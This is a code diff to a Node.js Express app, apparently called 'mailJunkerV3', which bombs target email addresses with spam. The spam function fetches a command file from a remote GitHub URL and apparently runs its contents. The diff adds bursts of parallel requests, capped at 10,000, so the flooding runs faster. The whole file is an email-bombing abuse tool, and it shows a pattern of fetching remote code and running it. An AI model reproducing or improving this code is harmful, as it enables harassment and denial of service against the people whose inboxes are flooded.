@@ -2,7 +2,7 @@ var express = require("express");
 var axios = require("axios");
 var path = require("path");
 var {v4: uuidv4} = require("uuid"); // for generating unique session IDs
-
+var maximumThrottleSpeed = 10000;
 var app = express();
 let stopFlag = false;
 
@@ -21,7 +21,6 @@ async function spam(sessionId, theemail) {
         console.log("Spam operation stopped.");
         return;
     }
-
     try {
         var response = await axios.get("https://raw.githubusercontent.com/crazystuffofficial/mailJunkerV3/main/fetchingCommand.txt");
         var code = response.data;
@@ -39,22 +38,24 @@ async function spam(sessionId, theemail) {
 }
 
 function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
-    let emailIndex = 0;
     let spamCount = 0;
-    var totalSpams = emails.length * emailsToSpam;
-
+    var totalSpams = emailsToSpam;
+    let startCount = 0;
+    var throttleSpeed = Math.min(Math.ceil(Math.sqrt(totalSpams)), maximumThrottleSpeed);
     var intervalId = setInterval(() => {
         if (stopFlag || spamCount >= totalSpams) {
             clearInterval(intervalId);
             console.log("All emails processed.");
             return;
         }
-
-        var email = emails[emailIndex];
-        spam(sessionId, email).then(() => {
-            spamCount++;
-            emailIndex = (emailIndex + 1) % emails.length;
-        });
+        for(var i = 0; i < throttleSpeed; i++){
+            if(startCount < totalSpams){
+                spam(sessionId, emails).then(() => {
+                    spamCount += emails.length;
+                });
+                startCount++;
+            }
+        }
     }, interval);
 }
 
